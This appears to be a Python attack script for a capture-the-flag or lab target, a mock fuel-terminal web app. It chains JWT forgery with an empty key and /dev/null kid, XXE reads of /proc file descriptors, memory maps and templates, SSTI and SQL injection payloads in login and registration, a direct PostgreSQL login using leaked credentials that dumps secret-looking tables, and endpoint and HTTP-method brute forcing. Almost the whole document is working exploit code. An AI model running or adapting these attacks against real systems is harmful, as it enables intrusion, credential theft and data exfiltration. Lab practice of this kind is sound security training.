#!/usr/bin/env python3
"""round72 — SSTI via registration + SQLi + /proc/fd + direct DB connect"""
import requests, json, time, hashlib, hmac as hm, base64, random, string, socket

HOST = "192.168.242.102"
CASPI = f"http://{HOST}:8007"

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_forged(role="operator", sub="ctf", company="X", kid="/dev/null", key=b''):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":kid},separators=(',',':')).encode()
    p = json.dumps({"sub":sub,"company":company,"role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(key, m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_forged('operator')}"}

def xxe_read(path, field="remarks", timeout=10):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    r = requests.post(f"{CASPI}/api/ops/custody/ingest",
        data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=timeout)
    if r.status_code == 200:
        data = json.loads(r.text)
        return 200, data.get("summary", data.get("ticket", {})).get(field, "")
    return r.status_code, r.text

rnd = ''.join(random.choices(string.ascii_lowercase, k=5))

# ============================================================
print("="*70)
print("PHASE 1: SSTI VIA REGISTRATION — company name")
print("="*70)
print("  Portal shows 'Welcome, <company>' — if rendered unsafely → RCE!")
print()

ssti_payloads = [
    ("{{7*7}}", "49"),
    ("{{config}}", "<Config"),
    ("${7*7}", "49"),
    ("{%print(7*7)%}", "49"),
    ("{{request.environ}}", "environ"),
    ("{{''.__class__}}", "str"),
]

for i, (payload, expect) in enumerate(ssti_payloads):
    tag = f"ssti{i}_{rnd}"
    email = f"ssti_{tag}@caspiterminal.kz"
    password = f"Ssti{tag}2026!"

    print(f"\n  Test {i}: company='{payload}'")
    print(f"    email: {email}")

    S = requests.Session()
    try:
        # Register
        r = S.post(f"{CASPI}/api/auth/register", json={
            "email": email,
            "password": password,
            "company": payload
        }, timeout=5)
        print(f"    Register: [{r.status_code}] {r.text[:200]}")

        if r.status_code in [200, 201]:
            # Login
            r = S.post(f"{CASPI}/api/auth/login", json={
                "email": email,
                "password": password
            }, timeout=5)
            print(f"    Login: [{r.status_code}] {r.text[:100]}")

            if r.status_code == 200:
                # Get portal
                r = S.get(f"{CASPI}/portal", timeout=5)
                print(f"    Portal: [{r.status_code}] ({len(r.text)} bytes)")

                # Check for SSTI evidence
                import re
                welcome = re.findall(r'Welcome,\s*(.{1,200})', r.text)
                if welcome:
                    print(f"    Welcome text: '{welcome[0]}'")
                    if expect in welcome[0]:
                        print(f"    *** SSTI CONFIRMED! '{payload}' → '{welcome[0]}' ***")

                # Also check full text for rendered output
                if expect in r.text and payload not in r.text:
                    print(f"    *** SSTI: payload rendered! '{expect}' found ***")
                elif payload in r.text:
                    print(f"    SSTI blocked: payload echoed as-is")
                else:
                    print(f"    Payload not found in response")

    except Exception as e:
        print(f"    Error: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: SSTI IN CUSTODY TICKET FIELDS")
print("="*70)
print("  What if ticket fields are rendered in a template somewhere?")

ssti_tickets = [
    ("{{config}}", "reference"),
    ("{{7*7}}", "reference"),
    ("{{config}}", "carrier"),
]

for payload, field in ssti_tickets:
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<ticket>
  <reference>{payload if field=="reference" else "REF-001"}</reference>
  <tankId>T-01</tankId><product>Diesel</product>
  <grossVolume>100</grossVolume><netVolume>99</netVolume>
  <density>0.85</density><temperature>20</temperature>
  <carrier>{payload if field=="carrier" else "TestCarrier"}</carrier>
  <remarks>{payload if field=="remarks" else "test"}</remarks>
</ticket>'''
    try:
        r = requests.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=5)
        print(f"  {field}='{payload}': [{r.status_code}] {r.text[:300]}")
        if "49" in r.text or "<Config" in r.text:
            print(f"  *** SSTI IN CUSTODY RESPONSE! ***")
    except Exception as e:
        print(f"  Error: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: SQL INJECTION IN LOGIN/REGISTER")
print("="*70)

# Test SQLi in login
sqli_payloads = [
    {"email": "' OR 1=1--", "password": "anything"},
    {"email": "admin@caspiterminal.kz' OR '1'='1", "password": "anything"},
    {"email": "test@test.com", "password": "' OR 1=1--"},
    {"email": "' UNION SELECT 1,2,3,4,5--", "password": "x"},
    {"email": "test@x.kz", "password": "x'; SELECT current_database();--"},
]

for payload in sqli_payloads:
    try:
        r = requests.post(f"{CASPI}/api/auth/login", json=payload, timeout=5)
        print(f"  Login {payload['email'][:40]}: [{r.status_code}] {r.text[:200]}")
        if r.status_code == 200:
            print(f"  *** SQLi IN LOGIN! ***")
    except Exception as e:
        print(f"  Error: {e}")

# Test SQLi in register
sqli_reg = [
    {"email": f"sqli1_{rnd}@x.kz", "password": "Test2026!", "company": "'; SELECT pg_read_file('/proc/self/environ');--"},
    {"email": f"sqli2_{rnd}@x.kz", "password": "Test2026!", "company": "x' UNION SELECT 1--"},
]

for payload in sqli_reg:
    try:
        r = requests.post(f"{CASPI}/api/auth/register", json=payload, timeout=5)
        print(f"  Register company='{payload['company'][:40]}': [{r.status_code}] {r.text[:200]}")
    except Exception as e:
        print(f"  Error: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: READ /proc/self/fd/* (file descriptors)")
print("="*70)
print("  Some FDs might point to log files or config")

for fd in range(0, 25):
    code, val = xxe_read(f"/proc/self/fd/{fd}")
    if code == 200 and val:
        print(f"  fd/{fd} ({len(val)} bytes): {val[:200]}")
    elif code == 400:
        print(f"  fd/{fd}: EXISTS (binary/special chars)")
    elif code == -1 or (code != 200):
        # Check if it's a timeout (pipe/socket → hangs)
        pass

# Also check master process FDs
for fd in range(0, 15):
    code, val = xxe_read(f"/proc/1/fd/{fd}", timeout=3)
    if code == 200 and val:
        print(f"  PID1 fd/{fd} ({len(val)} bytes): {val[:200]}")
    elif code == 400:
        print(f"  PID1 fd/{fd}: EXISTS (binary/special)")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: READ /proc/self/maps + cmdline alternatives")
print("="*70)

for path in [
    "/proc/self/maps",
    "/proc/self/smaps",
    "/proc/self/mountinfo",
    "/proc/self/mounts",
    "/proc/self/net/tcp",
    "/proc/self/net/tcp6",
    "/proc/self/net/unix",
    "/proc/self/task/13/children",
    "/proc/self/task/13/status",
]:
    code, val = xxe_read(path, timeout=5)
    if code == 200 and val:
        lines = val.split('\n')
        print(f"\n  {path} ({len(val)} bytes, {len(lines)} lines):")
        for line in lines[:20]:
            print(f"    {line}")
        if len(lines) > 20:
            print(f"    ... ({len(lines)-20} more lines)")

        # Look for interesting content
        for kw in ['probe', 'secret', 'flag', 'app.py', '/app/', 'gauge']:
            if kw.lower() in val.lower():
                # Find the specific line
                for line in lines:
                    if kw.lower() in line.lower():
                        print(f"    *** MATCH '{kw}': {line.strip()} ***")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: /services ENDPOINT — FULL CONTENT")
print("="*70)

try:
    r = requests.get(f"{CASPI}/services", timeout=5)
    print(f"  [{r.status_code}] /services ({len(r.text)} bytes):")
    print(r.text[:3000])
    if len(r.text) > 3000:
        print(f"  ... ({len(r.text)-3000} more)")
except Exception as e:
    print(f"  Error: {e}")

# With auth
try:
    r = requests.get(f"{CASPI}/services", headers=AUTH_OP, timeout=5)
    print(f"\n  [{r.status_code}] /services (with auth) ({len(r.text)} bytes):")
    if r.text[:100] != requests.get(f"{CASPI}/services", timeout=5).text[:100]:
        print(r.text[:3000])
    else:
        print("    Same as without auth")
except:
    pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: DIRECT POSTGRESQL CONNECTION ATTEMPT")
print("="*70)
print("  DB: postgresql://terminal_web:terminal_web_pw@terminal-db:5432/terminal")
print("  terminal-db = 172.18.0.3 (Docker internal)")
print()

# Try connecting to PostgreSQL on various hosts/ports
targets = [
    (HOST, 5432, "direct 5432"),
    (HOST, 8007, "via nginx (unlikely)"),
    ("172.18.0.3", 5432, "Docker internal (from Kali)"),
]

for target_host, port, desc in targets:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((target_host, port))
        if result == 0:
            print(f"  *** {desc} ({target_host}:{port}): OPEN! ***")
            # Try sending PostgreSQL startup message
            # Version 3.0 startup: length(4) + version(4) + params
            import struct
            params = b"user\x00terminal_web\x00database\x00terminal\x00\x00"
            length = 4 + 4 + len(params)
            startup = struct.pack("!II", length, 196608) + params  # 196608 = 3.0
            sock.send(startup)
            resp = sock.recv(1024)
            print(f"    Response: {resp[:100]}")
        else:
            print(f"  {desc} ({target_host}:{port}): closed (errno={result})")
        sock.close()
    except Exception as e:
        print(f"  {desc} ({target_host}:{port}): {e}")

# Try psycopg2 if available
try:
    import psycopg2
    print("\n  psycopg2 available! Trying direct connection...")
    for host in [HOST, "172.18.0.3", "terminal-db"]:
        try:
            conn = psycopg2.connect(
                host=host, port=5432,
                user="terminal_web", password="terminal_web_pw",
                database="terminal", connect_timeout=3
            )
            cur = conn.cursor()
            print(f"  *** CONNECTED to {host}:5432! ***")

            # Dump all tables
            cur.execute("SELECT table_name FROM information_schema.tables WHERE table_schema='public'")
            tables = cur.fetchall()
            print(f"  Tables: {[t[0] for t in tables]}")

            # Look for config/secrets tables
            for table in [t[0] for t in tables]:
                cur.execute(f"SELECT column_name FROM information_schema.columns WHERE table_name=%s", (table,))
                cols = [c[0] for c in cur.fetchall()]
                print(f"  {table}: {cols}")

                # If table has interesting columns, dump it
                if any(kw in ' '.join(cols).lower() for kw in ['secret', 'key', 'config', 'probe', 'flag', 'token']):
                    cur.execute(f"SELECT * FROM {table} LIMIT 10")
                    rows = cur.fetchall()
                    print(f"  *** {table} DATA: {rows} ***")

            # Try reading env vars through PostgreSQL
            cur.execute("SELECT current_setting('server_version')")
            print(f"  PG version: {cur.fetchone()[0]}")

            # Try pg_read_file
            try:
                cur.execute("SELECT pg_read_file('/proc/self/environ')")
                print(f"  *** /proc/self/environ: {cur.fetchone()[0][:500]} ***")
            except:
                print("  pg_read_file: permission denied (expected)")

            conn.close()
            break
        except Exception as e:
            print(f"  {host}: {e}")
except ImportError:
    print("  psycopg2 not available")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: HTTP METHODS ON PROBE ENDPOINTS")
print("="*70)

for method in ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"]:
    for path in ["/api/ops/probe", "/api/ops/probe/sign",
                 "/api/ops/probe/config", "/api/ops/probe/secret",
                 "/api/ops/probe/key"]:
        try:
            r = requests.request(method, f"{CASPI}{path}",
                headers=AUTH_OP, timeout=3,
                json={"device": "lm-01"} if method in ["POST","PUT","PATCH"] else None)
            if r.status_code not in [404, 405]:
                print(f"  [{r.status_code}] {method} {path}: {r.text[:200]}")
        except:
            pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 9: PROBE ERROR MESSAGES — LEAK INFO?")
print("="*70)

# Send probe with various invalid inputs to trigger error messages
test_cases = [
    {"url": "", "sig": ""},
    {"url": "http://127.0.0.1:3000/", "sig": "aaaa"},
    {"url": "http://gauge-gw.internal:9100/", "sig": "bbbb"},
    {"sig": "cccc"},  # Missing url
    {"url": "test"},  # Missing sig
    {},  # Empty
    {"url": "http://gauge-gw.internal:9100/v1/tanks/1/level",
     "sig": "0000000000000000000000000000000000000000000000000000000000000000"},
    # Correct URL, wrong sig (off by 1 byte)
    {"url": "http://gauge-gw.internal:9100/v1/tanks/1/level",
     "sig": "ece8b8f9671e56962dcb233b483c94fd1ea7384ec10d27288925572c6a44c804"},
    # Try to make the server reveal the expected sig
    {"url": "http://127.0.0.1:3000/api/ops/probe/sign?device=lm-01", "sig": "x"},
]

for tc in test_cases:
    try:
        r = requests.post(f"{CASPI}/api/ops/probe", json=tc,
                         headers=AUTH_OP, timeout=5)
        url_short = tc.get("url", "NONE")[:60]
        print(f"  url={url_short}: [{r.status_code}] {r.text[:200]}")
    except Exception as e:
        print(f"  Error: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 10: EXPLORE UNKNOWN API ENDPOINTS")
print("="*70)

endpoints_to_try = [
    "/api/ops", "/api/ops/",
    "/api/ops/custody", "/api/ops/custody/",
    "/api/ops/custody/list",
    "/api/ops/tanks", "/api/ops/tanks/",
    "/api/ops/tanks/1", "/api/ops/tanks/1/level",
    "/api/ops/meters", "/api/ops/meters/",
    "/api/ops/config", "/api/ops/config/",
    "/api/ops/devices", "/api/ops/status",
    "/api/auth", "/api/auth/",
    "/api/auth/me", "/api/auth/users",
    "/api/auth/profile", "/api/auth/whoami",
    "/api/auth/reset", "/api/auth/change-password",
    "/api/v1", "/api/v2",
    "/api/internal", "/api/debug",
    "/api/health", "/api/healthz",
    "/api/info", "/api/version",
    "/api/env", "/api/config",
    "/api/flag", "/api/secret",
    "/api/shell", "/api/llehs",
    "/api/ops/shell", "/api/ops/llehs",
    "/api/ops/flag",
    "/health", "/healthz",
    "/status", "/info",
    "/debug", "/config",
    "/env", "/flag",
    "/shell", "/llehs",
    "/api/ops/flow", "/api/ops/flow/",
    "/api/ops/loading", "/api/ops/schedule",
    "/api/ops/dispatch",
    # Werkzeug debugger
    "/console",
    "/_debug",
]

for path in endpoints_to_try:
    try:
        r = requests.get(f"{CASPI}{path}", headers=AUTH_OP, timeout=3, allow_redirects=False)
        if r.status_code not in [404]:
            print(f"  [{r.status_code}] {path}: {r.text[:200]}")
    except:
        pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 11: READ /app/templates/* FULLY (with FIXED extraction)")
print("="*70)

templates = [
    "/app/templates/portal.html",
    "/app/templates/error.html",
    "/app/templates/base.html",
    "/app/templates/index.html",
    "/app/templates/login.html",
    "/app/templates/register.html",
    "/app/templates/services.html",
    "/app/templates/loading.html",
    "/app/templates/custody.html",
    "/app/templates/probe.html",
    "/app/templates/admin.html",
    "/app/templates/dashboard.html",
]

for path in templates:
    code, val = xxe_read(path)
    if code == 200 and val:
        print(f"\n  {path} ({len(val)} bytes):")
        print(f"    {val[:500]}")
        if len(val) > 500:
            print(f"    ... ({len(val)-500} more)")

        # Look for API references, scripts, SSTI clues
        import re
        apis = re.findall(r'/api/[a-zA-Z0-9/_?&=.-]+', val)
        if apis: print(f"    APIs: {apis}")
        if '|safe' in val or 'Markup' in val or 'autoescape false' in val:
            print(f"    *** UNSAFE RENDERING DETECTED! ***")
    elif code == 400:
        print(f"  {path}: EXISTS (has HTML tags)")
    # empty = doesn't exist, skip

print("\n"+"="*70)
print("DONE")
print("="*70)
